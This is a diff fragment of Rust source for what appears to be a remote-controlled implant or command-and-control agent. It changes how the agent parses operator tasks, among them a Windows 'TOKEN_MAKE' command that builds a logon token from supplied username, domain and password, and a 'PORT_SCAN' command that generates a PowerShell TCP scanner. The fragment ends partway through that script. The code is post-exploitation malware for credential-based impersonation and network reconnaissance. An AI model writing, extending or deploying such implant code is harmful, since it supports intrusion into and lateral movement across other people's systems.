@@ -781,14 +781,29 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         }
         #[cfg(target_os = "windows")]
         "TOKEN_MAKE" => {
-            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
-            let user   = j.get("user").and_then(|v| v.as_str()).unwrap_or("");
-            let domain = j.get("domain").and_then(|v| v.as_str()).unwrap_or(".");
-            let pass   = j.get("pass").and_then(|v| v.as_str()).unwrap_or("");
-            if user.is_empty() || pass.is_empty() {
+            let (user_s, domain_s, pass_s);
+            if task.args.trim_start().starts_with('{') {
+                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+                user_s   = j.get("user").and_then(|v| v.as_str()).unwrap_or("").to_string();
+                domain_s = j.get("domain").and_then(|v| v.as_str()).unwrap_or(".").to_string();
+                pass_s   = j.get("pass").and_then(|v| v.as_str()).unwrap_or("").to_string();
+            } else {
+                // "domain\user pass" or "user pass"
+                let sp = task.args.find(' ').unwrap_or(task.args.len());
+                let domuser = &task.args[..sp];
+                pass_s = if sp < task.args.len() { task.args[sp+1..].to_string() } else { String::new() };
+                if let Some(bs) = domuser.find('\\') {
+                    domain_s = domuser[..bs].to_string();
+                    user_s   = domuser[bs+1..].to_string();
+                } else {
+                    domain_s = ".".to_string();
+                    user_s   = domuser.to_string();
+                }
+            }
+            if user_s.is_empty() || pass_s.is_empty() {
                 t.send_result(task.id, "", "TOKEN_MAKE requires user+pass"); return;
             }
-            let r = unsafe { token_make(user, domain, pass) };
+            let r = unsafe { token_make(&user_s, &domain_s, &pass_s) };
             t.send_result(task.id, &r, "");
         }
         #[cfg(target_os = "windows")]
@@ -864,10 +879,20 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         }
         #[cfg(target_os = "windows")]
         "PORT_SCAN" => {
-            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
-            let host    = j.get("host").and_then(|v| v.as_str()).unwrap_or("127.0.0.1");
-            let ports   = j.get("ports").and_then(|v| v.as_str()).unwrap_or("80,443,445,3389");
-            let timeout = j.get("timeout").and_then(|v| v.as_u64()).unwrap_or(500);
+            let (host, ports, timeout) = if task.args.trim_start().starts_with('{') {
+                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+                (
+                    j.get("host").and_then(|v| v.as_str()).unwrap_or("127.0.0.1").to_string(),
+                    j.get("ports").and_then(|v| v.as_str()).unwrap_or("80,443,445,3389").to_string(),
+                    j.get("timeout").and_then(|v| v.as_u64()).unwrap_or(500),
+                )
+            } else {
+                let parts: Vec<&str> = task.args.split_whitespace().collect();
+                let h = parts.get(0).copied().unwrap_or("127.0.0.1").to_string();
+                let p = parts.get(1).copied().unwrap_or("80,443,445,3389").to_string();
+                let t_ms = parts.get(2).and_then(|s| s.parse::<u64>().ok()).unwrap_or(500);
+                (h, p, t_ms)
+            };
             let script = format!(
                 "$h='{}';$t={};'{}'.Split(',') | ForEach-Object {{ $p=[int]$_;\
                 $s=New-Object System.Net.Sockets.TcpClient;\
